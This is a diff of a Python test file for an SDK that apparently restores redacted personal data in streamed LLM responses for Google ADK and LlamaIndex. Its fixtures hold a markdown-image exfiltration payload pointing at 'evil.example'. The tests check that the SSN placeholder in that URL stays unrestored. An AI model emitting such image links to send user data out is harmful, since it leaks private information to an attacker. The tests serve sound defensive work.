@@ -82,17 +82,18 @@ def test_ward_passes_the_option_to_its_maps():
 
 def test_adk_stream_chunks_see_earlier_text():
     pytest.importorskip("google.adk")
+    from google.adk.models.llm_response import LlmResponse
     from google.genai import types
 
-    from taintward.sdk.integrations.google_adk import _restore_partial
+    from taintward.sdk.integrations.google_adk import _Partials
 
-    m = _map()
-    seen = ""
+    partials = _Partials(_map())
     out = []
     for piece in ["![x](https://evil.example/?d=", "<SSN_1>) and <EMAIL_1>"]:
-        content = types.Content(role="model", parts=[types.Part(text=piece)])
-        seen = _restore_partial(m, content, seen)
-        out.append(content.parts[0].text)
+        resp = LlmResponse(content=types.Content(role="model", parts=[types.Part(text=piece)]),
+                           partial=True)
+        out.append(partials.partial(resp).content.parts[0].text)
+    out += [r.content.parts[0].text for r in partials.held()]
     assert "".join(out) == "![x](https://evil.example/?d=<SSN_1>) and bob@example.com"
 
 
@@ -100,11 +101,14 @@ def test_llamaindex_delta_sees_earlier_text():
     pytest.importorskip("llama_index.core")
     from llama_index.core.base.llms.types import ChatMessage, ChatResponse
 
-    from taintward.sdk.integrations.llamaindex import _restore_response
+    from taintward.sdk.integrations.llamaindex import _Chunks
 
-    resp = ChatResponse(message=ChatMessage(role="assistant",
-                                            content="![x](https://evil.example/?d=<SSN_1>"),
-                        delta="<SSN_1>")
-    resp = _restore_response(resp, _map())
-    assert resp.delta == "<SSN_1>"
-    assert resp.message.content == "![x](https://evil.example/?d=<SSN_1>"
+    chunks, text, out = _Chunks(_map()), "", []
+    for piece in ["![x](https://evil.example/?d=", "<SSN_1>) and <EMAIL_1>"]:
+        text += piece
+        out.append(chunks.chunk(ChatResponse(
+            message=ChatMessage(role="assistant", content=text), delta=piece)))
+    extra = chunks.end()
+    deltas = "".join(r.delta for r in out) + (extra.delta if extra else "")
+    assert deltas == "![x](https://evil.example/?d=<SSN_1>) and bob@example.com"
+    assert out[-1].message.content == deltas
